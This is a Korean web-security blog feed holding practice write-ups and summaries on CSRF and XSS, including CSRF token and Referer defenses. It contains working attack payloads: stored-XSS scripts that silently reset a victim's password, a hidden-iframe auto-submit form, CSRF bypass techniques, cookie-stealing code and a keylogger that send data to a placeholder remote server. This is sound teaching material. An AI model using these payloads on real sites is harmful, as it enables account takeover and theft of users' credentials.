	<span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByTagName</span><span class="p">(</span><span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">login-pw</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">pw</span><span class="p">;</span>
	<span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByTagName</span><span class="p">(</span><span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">submit</span><span class="p">();</span>
<span class="p">}</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<h4 id="공격시작">공격시작</h4>
<ol>
  <li>완성된 스크립트를 이용하여 게시글을 작성한다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/089f4135-01d5-4fc3-9ea5-12a8d5e5f65d" alt="Pasted image 20230523022549" /></li>
  <li>게시글을 저장해준다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/40c9edbf-9fa2-4377-91b8-7cd6e8af08a5" alt="Pasted image 20230523005809" /></li>
  <li>사용자가 게시글을 방문하게 되면 비밀번호가 스크립트에서 설정한 <code class="language-plaintext highlighter-rouge">1234</code>로 변경된다. 서버에서는 자동으로 세션 값이 만료 시킨다. 로그인이 필요하지만 사용자는 정상적으로 게시글에 방문한 것 처럼 느끼게 된다. 왜냐하면 바뀐 비밀번호로 로그인을 하여 세션 값을 서버로부터 받기 때문이다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/01194217-8ab1-4b51-9a2b-1ba16c4c51dc" alt="Pasted image 20230523023818" /></li>
</ol>

<h2 id="결론">결론</h2>
<ul>
  <li>iframe 과 서로 쿠키 값을 공유하기 때문에 가능한 방법이었다.</li>
  <li>사용자는 정상적으로 게시글을 확인한 것 처럼 느낄것이다. 하지만 사용자는 로그아웃 하고 다시 로그인 할 때 비밀번호가 변경되었다는 것을 알 수 있다.</li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="XSS" /><category term="CSRF" /><category term="웹 해킹" /><summary type="html"><![CDATA[CSRF 실습 1번 문제를 풀어보자.]]></summary></entry><entry><title type="html">CSRF 실습 2</title><link href="http://localhost:4000/CSRF%EC%8B%A4%EC%8A%B52/" rel="alternate" type="text/html" title="CSRF 실습 2" /><published>2023-05-23T00:00:00+09:00</published><updated>2021-05-23T23:13:00+09:00</updated><id>http://localhost:4000/CSRF%EC%8B%A4%EC%8A%B52</id><content type="html" xml:base="http://localhost:4000/CSRF%EC%8B%A4%EC%8A%B52/"><![CDATA[<h2 id="csrf-실습-2번-문제-설">CSRF 실습 2번 문제 설</h2>
<ul>
  <li>CSRF 1번 문제와 비슷하게 계정의 비밀번호를 변경하는 문제이다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/e73d2fca-6932-4692-b5bb-527d33c09b2f" alt="Pasted image 20230523031645" /></li>
</ul>

<h2 id="서버-분석-및-취약점-찾기">서버 분석 및 취약점 찾기</h2>

<h3 id="비밀번호-변경-요청">비밀번호 변경 요청</h3>
<ul>
  <li>오직 POST 요청으로만 비밀번호를 변경할 수 있다.</li>
</ul>

<h3 id="게시글--stored-xss-">게시글 ( Stored XSS )</h3>
<ul>
  <li>게시글 제목과 게시글 본문에 XSS 취약점이 존재한다.</li>
  <li>POC 코드 <code class="language-plaintext highlighter-rouge">alert(1)</code> 을 통해 확인이 가능하다.</li>
  <li>게시글 제목<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/14ea3881-b828-4647-9e7d-7c7e7599e65b" alt="Pasted image 20230523125242" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/74654dbd-7f59-40c7-9efd-a90a09ff0474" alt="Pasted image 20230523125304" /></li>
  <li>게시글 본문<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/55f3ac55-414b-4586-9216-90b486174bef" alt="Pasted image 20230523125334" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/780e58ae-1d6b-4801-b0a7-70bfb49d052a" alt="Pasted image 20230523125351" /></li>
  <li>script 태그 부분의 내용은 게시글에서 안보인다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/4fb232eb-2d4d-4883-9d73-81ef936569bd" alt="Pasted image 20230523125414" /></li>
</ul>

<h3 id="비밀번호-변경">비밀번호 변경</h3>
<ul>
  <li>비밀번호 변경을 한 후 <code class="language-plaintext highlighter-rouge">location.href</code> 를 통해 클라이언트 측에서 로그아웃 요청을 서버로 보낸다.</li>
  <li>즉 서버에서는 클라이언트 측에서 로그아웃 신호를 보내주기 전 까지는 세션을 만료 시키지 않는다.</li>
</ul>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">=</span><span class="dl">'</span><span class="s1">index.php?session=true</span><span class="dl">'</span><span class="p">;</span>
</code></pre></div></div>

<h2 id="공격-시나리오">공격 시나리오</h2>

<h3 id="xss게시판--csrf비밀번호-변경-요청-취약점-이용하기">XSS(게시판) + CSRF(비밀번호 변경 요청) 취약점 이용하기.</h3>

<h4 id="최종-목표">최종 목표</h4>
<ul>
  <li>사용자자 공격자가 작성한 게시글에 방문하면 사용자도 모르게 자동으로 비밀번호가 바뀐다. 하지만 사용자는 정상적으로 게시글을 방문한 것 처럼 느낀다. 즉 사용자는 로그아웃 하고 다시 로그인할 때 까지 비밀번호가 변경되었다는 것을 알아차리기 힘들다.</li>
</ul>

<h4 id="비밀번호-변경-요청-동작-방식--예측-">비밀번호 변경 요청 동작 방식 ( 예측 )</h4>
<ol>
  <li>POST 요청으로 사용자가 입력한 비밀번호를 전송하여 변경한다.</li>
  <li>사용자는 응답으로 로그아웃을 하라는 링크를 받는다.</li>
  <li>사용자는 서버로 로그아웃 요청을 보내어 로그아웃을 진행한다.</li>
</ol>

<ul>
  <li>비밀번호 변경 POST 요청<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/8adbbd7e-51cf-448e-9da7-d3b4e5ebb87b" alt="Pasted image 20230523124958" /></li>
</ul>

<h4 id="시나리오">시나리오</h4>
<ol>
  <li>공격자는 악성 스크립트가 담긴 게시글을 작성한다.</li>
  <li>사용자는 로그인하여 공격자의 게시글을 확인한다.</li>
  <li>사용자가 공격자의 게시글에 방문하면 악성 스크립트가 동작하여 사용자의 비밀번호를 공격자가 설정한 비밀번호로 변경한다.</li>
  <li>비밀번호가 변경 되었어도 사용자가 서버로 로그아웃 요청을 보내지 않아 계속 서비스를 이용할 수 있다.</li>
</ol>

<h4 id="공격-스크립트">공격 스크립트</h4>

<h5 id="스크립트로-post-요청-보내기">스크립트로 POST 요청 보내기</h5>
<ul>
  <li>fetch 함수를 이용하였다.</li>
  <li>fetch를 이용하여 post 요청을 보내면 응답으로 <code class="language-plaintext highlighter-rouge">location.href</code> 을 받지만 실행되지 않아 자동으로 로그아웃 되는 것을 방지할 수 있다. ( 세션 만료 방지 )</li>
</ul>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
<span class="nf">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">mypage_update.php</span><span class="dl">"</span><span class="p">,{</span>
	<span class="na">method</span><span class="p">:</span> <span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span>
	<span class="na">headers</span><span class="p">:</span> <span class="p">{</span>
		<span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span>
	<span class="p">},</span>
	<span class="na">body</span><span class="p">:</span> <span class="dl">"</span><span class="s2">id=&amp;info=&amp;pw=2222</span><span class="dl">"</span>
<span class="p">});</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<h5 id="최종-공격-스크립트">최종 공격 스크립트</h5>
<ul>
  <li>자동으로 비밀번호 변경 요청을 서버로 보내게 된다.</li>
</ul>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
<span class="nf">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">mypage_update.php</span><span class="dl">"</span><span class="p">,{</span>
	<span class="na">method</span><span class="p">:</span> <span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span>
	<span class="na">headers</span><span class="p">:</span> <span class="p">{</span>
		<span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span>
	<span class="p">},</span>
	<span class="na">body</span><span class="p">:</span> <span class="dl">"</span><span class="s2">id=&amp;info=&amp;pw=2222</span><span class="dl">"</span>
<span class="p">});</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<h4 id="공격시작">공격시작</h4>
<ol>
  <li>공격자는 악성 스크립트가 담긴 게시글 작성한다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/a955160b-60a8-4575-bd87-548d119377ee" alt="Pasted image 20230523125941" /></li>
  <li>게시글을 저장해준다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/391c5b4b-caba-43fe-a73c-46d69b1768ad" alt="Pasted image 20230523130032" /></li>
  <li>사용자가 공격자가 작성한 게시글에 방문하게 되면 자동으로 비밀번호가 바뀌게 된다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/6154015a-65cc-4da4-88af-ed3e60b24fa6" alt="Pasted image 20230523130148" /></li>
</ol>

<h2 id="결론">결론</h2>
<ul>
  <li>Javascript의 fetch 함수를 이용하여 POST 요청을 서버에 보내고 응답을 받아온다.</li>
  <li>사용자는 일반적인 게시글을 방문한 것 처럼 느끼게 된다. 하지만 실제로는 게시글 방문과 동시에 비밀번호 요청이 가는 것을 확인할 수 있다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/b90ae746-4800-4425-99a2-ba2a32be7fff" alt="Pasted image 20230523130254" /></li>
</ul>

<h2 id="참고-사이트">참고 사이트</h2>
<ul>
  <li><a href="https://www.daleseo.com/js-window-fetch/">자바스크립트의 fetch() 함수로 원격 API 호출하기</a></li>
  <li><a href="https://velog.io/@seoltang/fetch-POST-Request">fetch 함수: POST Request (velog.io)</a></li>
  <li><a href="https://sisiblog.tistory.com/261">자바스크립트 fetch로 formdata post 보내기 (tistory.com)</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="XSS" /><category term="CSRF" /><category term="웹 해킹" /><summary type="html"><![CDATA[CSRF 실습 2번 문제를 풀어보자.]]></summary></entry><entry><title type="html">CSRF 간단한 정리</title><link href="http://localhost:4000/CSRF%EA%B0%84%EB%8B%A8%ED%95%9C%EC%A0%95%EB%A6%AC/" rel="alternate" type="text/html" title="CSRF 간단한 정리" /><published>2023-05-21T00:00:00+09:00</published><updated>2021-05-20T23:13:00+09:00</updated><id>http://localhost:4000/CSRF%EA%B0%84%EB%8B%A8%ED%95%9C%EC%A0%95%EB%A6%AC</id><content type="html" xml:base="http://localhost:4000/CSRF%EA%B0%84%EB%8B%A8%ED%95%9C%EC%A0%95%EB%A6%AC/"><![CDATA[<h2 id="csrf--cross-site-request-forgery--란">CSRF ( Cross Site Request Forgery ) 란</h2>
<ul>
  <li>요청을 위조하는 공격이다.</li>
  <li>피해자가 몰랐던 요청을 서버에 보내게 하는 공격이다.</li>
  <li>피해자는 자신의 의도와는 다르게, 서버로 임이의 요청을 하게 만드는 공격이다.</li>
  <li>피해자 세션을 활용한 공격이다.</li>
</ul>

<h2 id="발생-위치">발생 위치</h2>
<ul>
  <li>모든 요청에서 발생할 수 있다.</li>
  <li>비밀번호 변경, 이메일 주소 변경, 관리자 계정 등록 등.</li>
</ul>

<h2 id="중요">중요</h2>
<ul>
  <li>단 피해자가 로그인을 한 채로 링크를 클릭해야 피해자 세션 정보로 요청이 보내진다.</li>
</ul>

<h2 id="공격-방법">공격 방법</h2>

<h3 id="get-방식일-때">GET 방식일 때</h3>
<ul>
  <li>CSRF 공격이 쉬워진다.</li>
  <li>요청을 주는 url을 만들어 사용자에게 주어 클릭하도록 만들어주면 된다.</li>
</ul>

<h3 id="post-방식일-때">POST 방식일 때</h3>
<ol>
  <li>가장 간단한 방법은 사용자가 클릭하게 유도하는 방법.</li>
  <li>XSS 취약점과 CSRF 취약점을 합쳐서 공격하는 방법. 단 같은 도메인에서 두개(xss, csrf)의 취약점이 나타나야 한다.</li>
</ol>

<ul>
  <li>iframe 을 이용하여 form post 결과를 iframe 에서 볼 수 있게 만든다. 이러면 페이지 이동은 없으면서 사용자는 자신도 모르게 요청을 보내게 된다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;iframe width="0" height="0" border="0" name="frame" id="frame" style="display:none;"&gt;&lt;/iframe&gt;


&lt;form method="POST" action="xxx" target="frame"&gt;
	&lt;input&gt;
&lt;/form&gt;

&lt;script&gt;
document.forms[0].submit();
&lt;/script&gt;
</code></pre></div></div>

<h2 id="csrf-방어하기">CSRF 방어하기</h2>

<h3 id="csrf를-referrer-로-막기">CSRF를 Referrer 로 막기</h3>

<h4 id="referrer-란">Referrer 란?</h4>
<ul>
  <li>이 요청을 어디서 한 건지 확인하는 용도이다.</li>
</ul>

<h3 id="referrer-로-막기">Referrer 로 막기</h3>
<ul>
  <li>예를들어 마이페이지에서 비밀번호 변경 요청이 와야 정상 요청이다.</li>
  <li>게시판 같은 곳에서 비밀번호 변경 요청이 오면 비정상적인 요청인 것 이다.</li>
  <li>요청을 어디서 한 것인지 확인하여 비정상적인 요청이면 막아 CSRF 공격을 예방할 수 있다.</li>
</ul>

<h3 id="csrf-토큰을-이용하여-막기">CSRF 토큰을 이용하여 막기</h3>

<h4 id="csrf-토큰-란">CSRF 토큰 란?</h4>
<ul>
  <li>CSRF 를 막기위해 만들어진 것 이다.</li>
  <li>서버에서 CSRF 토큰을 발행하여 요청이 발생하는 페이지에 몰래 넣어둔다.</li>
  <li>사용자가 요청을 보내면 토큰 값도 같이 요청의 파라미터로 보내진다.</li>
</ul>

<h4 id="csrf-토큰으로-막기">CSRF 토큰으로 막기</h4>
<ul>
  <li>사용자가 요청한 토큰 값과 서버에 저장된 토큰 값이 일치해야 정상적인 요청이라 판단한다.</li>
  <li>따라서 공격자는 서버에서 발행하는 CSRF 토큰을 알 수가 없어 CSRF 공격을 성공시킬 수 없다.</li>
</ul>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">action=</span><span class="s">"~~"</span><span class="nt">&gt;</span>
... 생략 ...
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">style=</span><span class="s">"display:none;"</span> <span class="na">value=</span><span class="s">"csrf 토큰"</span><span class="nt">&gt;</span>
... 생략 ...
<span class="nt">&lt;/form&gt;</span>
</code></pre></div></div>

<h2 id="우회-방법">우회 방법</h2>
<h3 id="referrer-check-bypass">Referrer Check Bypass</h3>
<ul>
  <li>referrer 헤더 체크 동작방식이 다음과 같으면 referrer 헤더를 없애서 검사를 우회할 수 있다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>만약 referrer 헤더가 존재하면
	검사시작
없으면
	그냥 패스
</code></pre></div></div>

<ul>
  <li>다음 방법으로 referrer 헤더를 없앨 수 있다.</li>
</ul>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"referrer"</span> <span class="na">content=</span><span class="s">"no-referrer"</span><span class="nt">&gt;</span>
</code></pre></div></div>

<h3 id="csrf-토큰-bypass">CSRF 토큰 Bypass</h3>
<ul>
  <li>XSS 취약점을 이용하여야 한다.</li>
  <li>먼저 토큰을 발행하는 페이지를 찾는다.</li>
  <li><code class="language-plaintext highlighter-rouge">iframe</code> 을 활용해 준다. 토큰 발행 페이지를 iframe을 통해 불러오고, iframe 에 접근하여 토큰을 파싱해 온다.</li>
  <li>토큰과 같이 요청을 서버로 보내면 공격성공이다. 서버는 CSRF 토큰을 보고 정상적인 요청이라 판단한다.</li>
</ul>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"csrf 토큰을 발행하는 페이지"</span><span class="nt">&gt;</span> <span class="nt">&lt;/iframe&gt;</span>
<span class="nt">&lt;script&gt;</span>
<span class="nx">iframe</span> <span class="nx">접근하여</span> <span class="nx">csrf</span> <span class="nx">토큰을</span> <span class="nx">파싱해서</span> <span class="nx">가지고</span> <span class="nx">온다</span><span class="p">.</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<h2 id="xss-와-csrf-차이점">XSS 와 CSRF 차이점</h2>

<h3 id="csrf">CSRF</h3>
<ul>
  <li>피해자가 자신도 모르게 서버로 임이의 요청을 보내게 하는 공격이다.</li>
</ul>

<h3 id="xss">XSS</h3>
<ul>
  <li>클라이언트 측 스크립트를 삽입하는 공격이다.</li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="XSS" /><category term="CSRF" /><category term="웹 해킹" /><summary type="html"><![CDATA[CSRF 란 무엇일까.]]></summary></entry><entry><title type="html">XSS 총 정리</title><link href="http://localhost:4000/XSS%EC%A0%95%EB%A6%AC/" rel="alternate" type="text/html" title="XSS 총 정리" /><published>2023-05-20T00:00:00+09:00</published><updated>2023-05-20T23:13:00+09:00</updated><id>http://localhost:4000/XSS%EC%A0%95%EB%A6%AC</id><content type="html" xml:base="http://localhost:4000/XSS%EC%A0%95%EB%A6%AC/"><![CDATA[<h2 id="xss--cross-site-scripting--란">XSS ( Cross-Site Scripting ) 란</h2>
<ul>
  <li>클라이언트 측 스크립트를 삽입하는 공격이다.</li>
  <li>웹 애플리케이션에서 발생하는 취약점이다.</li>
  <li>클라이언트 만이 피해를 입는다. 즉 서버에는 아무런 악영향을 안 끼친다.</li>
  <li>클라이언트의 브라우저에서 개발자가 의도하지 않았던 스크립트가 실행된다.</li>
  <li>취약한 웹 애플리케이션을 이용하는 사용자가 주 타겟이 된다.</li>
  <li>사용자 쿠키를 탈취하는 세션 하이재킹( session hijacking ) 공격을 수행할 수 있다.</li>
</ul>

<h2 id="클라이언트-측-코드">클라이언트 측 코드</h2>
<ul>
  <li>html</li>
  <li>javascript</li>
  <li>css</li>
</ul>

<h2 id="poc-코드">POC 코드</h2>
<ul>
  <li>웹 애플리케이션 XSS 취약점을 이용한 공격이 가능함을 확인할 수 있다.</li>
</ul>

<h3 id="자주-이용하는-poc-코드">자주 이용하는 POC 코드</h3>
<ul>
  <li><code class="language-plaintext highlighter-rouge">alert(1)</code></li>
  <li><code class="language-plaintext highlighter-rouge">console.log(1)</code></li>
</ul>

<h2 id="공격-피해">공격 피해</h2>

<h3 id="사용자-쿠키-탈취">사용자 쿠키 탈취</h3>
<ul>
  <li>document.cookie 를 활용하여 사용자 쿠키 값을 훔친다.</li>
  <li>사용자 브라우저의 쿠키에 저장된 합법적인 <strong>Session ID 값</strong>이나 <strong>액세스 토큰 값</strong>을 훔쳐 원격지 서버로 전송한다.</li>
</ul>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">hackUrl</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">원격지 서버?value=</span><span class="dl">"</span><span class="p">;</span>
<span class="k">new</span> <span class="nc">Image</span><span class="p">().</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">hackURL</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span>
</code></pre></div></div>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">x</span> <span class="na">onerror=</span><span class="s">'var hackUrl = "원격지 서버?value=";new Image().src = hackURL + document.cookie;'</span><span class="nt">&gt;</span>
</code></pre></div></div>

<h3 id="사용자-개인정보-탈취">사용자 개인정보 탈취</h3>
<ul>
  <li>Key Logger 방식으로 사용자 입력을 탈취한다.</li>
  <li>XSS Keylog 가 삽입된 페이지에 사용자가 접근하면 Keyboard Event 를 통해 입력 값을 후킹한다.</li>
  <li>후킹한 값을 원격지 서버로 전송한다.</li>
</ul>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">keys</span> <span class="o">=</span> <span class="dl">""</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">hackUrl</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">원격지 서버?value=</span><span class="dl">"</span><span class="p">;</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">onkeypress</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span> 
	<span class="kd">get</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">event</span><span class="p">?</span><span class="nx">event</span><span class="p">:</span><span class="nx">e</span><span class="p">;</span>
	<span class="nx">key</span> <span class="o">=</span> <span class="kd">get</span><span class="p">.</span><span class="nx">keyCode</span><span class="p">?</span><span class="kd">get</span><span class="p">.</span><span class="nx">keyCode</span><span class="p">:</span><span class="kd">get</span><span class="p">.</span><span class="nx">charCode</span><span class="p">;</span> 
	<span class="nx">key</span> <span class="o">=</span> <span class="nb">String</span><span class="p">.</span><span class="nf">fromCharCode</span><span class="p">(</span><span class="nx">key</span><span class="p">);</span> 
	<span class="nx">keys</span><span class="o">+=</span><span class="nx">key</span><span class="p">;</span> 
<span class="p">}</span> 
<span class="nb">window</span><span class="p">.</span><span class="nf">setInterval</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span> 
	<span class="nf">if</span><span class="p">(</span><span class="nx">keys</span> <span class="o">!=</span> <span class="dl">''</span><span class="p">)</span> <span class="p">{</span> 
		<span class="k">new</span> <span class="nc">Image</span><span class="p">().</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">hackUrl</span> <span class="o">+</span> <span class="nx">keys</span><span class="p">;</span>
		<span class="nx">keys</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span> 
	<span class="p">}</span> 
<span class="p">},</span> <span class="mi">200</span><span class="p">);</span>
</code></pre></div></div>

<h3 id="악성코드-다운로드">악성코드 다운로드</h3>
<ul>
  <li>사용자가 악성 스크립트가 있는 URL을 클릭하도록 유도하여 악성 프로그램 다운로드 받는 사이트로 리타이렉한다.</li>
  <li>사용자가 악성 프로그램을 다운로드 하도록 유도한다.</li>
</ul>

<h3 id="피싱-사이트-강제-이동">피싱 사이트 강제 이동</h3>
<ul>
  <li>가짜 사이트로 위장하여 사용자의 로그인 정보를 탈취한다.</li>
  <li>실제 사이트와 유사한 웹 페이지를 통해 사용자의 개인정보를 훔쳐올 수 있다.</li>
</ul>

<h2 id="공격-유형">공격 유형</h2>

<h3 id="stored--또는-persistent--xss">Stored ( 또는 Persistent ) XSS</h3>
<ul>
  <li>공격자가 악성 스크립트를 취약한 웹 서버에 저장하는 공격이다.</li>
  <li>광역적으로 공격이 가능하다. 하지만 흔적이 웹 서버에 남는다.</li>
  <li>지속적으로 피해를 입히는 공격이다.</li>
  <li>공격자가 악성 스크립트를 웹 서버 페이지에 저장하고 해당 페이지가 사용자에게 노출시켜 악성 스크립트가 사용자 브라우저에서 자동으로 실행되게 된다.</li>
</ul>

<h4 id="취약점-유형">취약점 유형</h4>
<ul>
  <li>댓글</li>
  <li>게시판</li>
  <li>이메일</li>
  <li>블로그 글</li>
  <li>채팅방의 유저 이름</li>
</ul>

<h4 id="공격-과정">공격 과정</h4>
<ol>
  <li>공격자가 Stored XSS 취약점을 가지는 웹 페이지( 게시판 )를 찾는다.</li>
  <li>공격자가 게시판에 사용자의 민감한 정보( 쿠키 )를 탈취하기 위한 악성 스크립트 코드를 포함한  글을 작성하고 저장한다.</li>
  <li>공격자가 작성한 글에 사용자가 들어가면 민감한 정보(쿠키)를 공격자에게 전송한다.</li>
</ol>

<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7qs7XqsqnsnpAgLT4-IOqzteqyqeyekCA6IOy3qOyVve2VnCDsm7kg7Y6Y7J207KeAIOywvuq4sFxu6rO16rKp7J6QIC0-PiDqs7XqsqnsnpAgOiDqsozsi5zquIAg7J6R7ISxXG7qs7XqsqnsnpAgLT4-IOybuSDshJzrsoQgOiDqsozsi5zquIAg7KCA7J6lXG7sgqzsmqnsnpAgLT4-IOybuSDshJzrsoQgOiDqsozsi5zquIAg66qp66GdIOyalOyyrVxu7Ju5IOyEnOuyhCAtPj4g7IKs7Jqp7J6QIDog6rKM7Iuc6riAIOuqqeuhnSDsnZHri7VcbuyCrOyaqeyekCAtPj4g7IKs7Jqp7J6QIDog6rO16rKp7J6QIOqyjOyLnOq4gCDtgbTrpq1cbuyCrOyaqeyekCAtPj4g6rO16rKp7J6QIDog66-86rCQ7ZWcIOygleuztCDsoITri6wiLCJtZXJtYWlkIjpudWxsfQ" /></p>

<h3 id="reflected-xss">Reflected XSS</h3>
<ul>
  <li>Get 방식을 통해 공격이 이루어 진다.</li>
  <li>사용자 입력을 그대로 페이지에 보여주는 곳에서 발생한다.</li>
  <li>공격자는 URL에 악성 스크립트를 심고, 만들어진 URL을 사용자에게 전달한다. 이러면 사용자 브라우저에서 악성 스크립트가 실행된다.</li>
  <li>SSR ( Server Side Rendering ). 서버에서 페이지를 완성하여 사용자에게 보내주는 페이지에서 발생하는 취약점이다.</li>
</ul>

<h4 id="취약점-유형-1">취약점 유형</h4>
<ul>
  <li>사용자 입력을 그대로 페이지에 보여주는 사이트.</li>
  <li>사용자 입력이 웹 페이지 코드에 그대로 들어가는 사이트.</li>
</ul>

<h4 id="과정">과정</h4>
<ol>
  <li>공격자가 Reflected XSS 취약점이 있는 페이지를 찾는다.</li>
  <li>공격자는 XSS 취약점 페이지의 URL의 파라미터에 악성 스크립트 코드를 사입하여 공격 URL을 만든다.</li>
  <li>공격자가 만든 URL을 사용자에게 건내주어 클릭하도록 유도한다.</li>
  <li>사용자가 링크를 클릭하여 페이지 들어 가면 사용자 브라우저에서 악성 스크립트가 실행된다.</li>
</ol>

<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7qs7XqsqnsnpAgLT4-IOqzteqyqeyekCA6IFJlZmxlY3RlZCBYU1Mg7Leo7JW97KCQIO2OmOydtOyngCDssL7quLBcbuqzteqyqeyekCAtPj4g6rO16rKp7J6QIDog7JWF7ISxIOyKpO2BrOumve2KuOulvCDri7TsnYAgVVJMIOunjOuTrFxu6rO16rKp7J6QIC0-PiDsgqzsmqnsnpAgOiBVUkwg66eB7YGs66W8IO2BtOumre2VmOuPhOuhnSDsnKDrj4RcbuyCrOyaqeyekCAtPj4g7IKs7Jqp7J6QIDogVVJMIO2BtOumrVxu7IKs7Jqp7J6QIC0-PiDsm7kg7ISc67KEIDog7Y6Y7J207KeAIOyalOyyrVxu7Ju5IOyEnOuyhCAtPj4g7IKs7Jqp7J6QIDog7JmE7ISx65CcIO2OmOydtOyngCDsnZHri7VcbuyCrOyaqeyekCAtPj4g7IKs7Jqp7J6QIDog7JWF7ISxIOyKpO2BrOumvSDsi6TtlolcbuyCrOyaqeyekCAtPj4g6rO16rKp7J6QIDog66-86rCQ7ZWcIOygleuztCDsoITri6wiLCJtZXJtYWlkIjpudWxsfQ" /></p>

<h3 id="dom-based-xss">DOM Based XSS</h3>
<ul>
  <li>서버 측에서 탐지하기가 어렵다.</li>
  <li>최초에 HTML 문서를 서버로 부터 받으면, 그 이후에는 서버로 요청을 보내지 않고 악성스크립트를 심을 수 있다.</li>
  <li>서버에 요청은 없지만,  URL 주소 해시에 심은 악성 스크립트가 실행된다.</li>
  <li>CSR(Client Side Rendering) 클라이언트 사이드에서 페이지를 그려준다. 즉 클라이언트 브라우저의 javascript 에서 get 요청 값을 가져와 페이지를 완성시킨다.</li>
</ul>

<h4 id="취약점-유형-2">취약점 유형</h4>
<ul>
  <li>사용자 입력을 그대로 페이지에 보여주는 사이트.</li>
</ul>

<h4 id="과정-1">과정</h4>
<ol>
  <li>공격자는 DOM Based XSS 취약점이 있는 페이지를 찾는다.</li>
  <li>공격자는 XSS 취약점이 있는 페이지 URL의 파라미터에 악성 스크립트를 넣어준다.</li>
  <li>공격자는 완성한 URL을 사용자에게 보내어 클릭하도록 유도한다.</li>
  <li>사용자가 URL 링크를 클릭하여 페이지에 들어가면 사용자 브라우저에서 악성 스크립트가 동작한다.</li>
</ol>

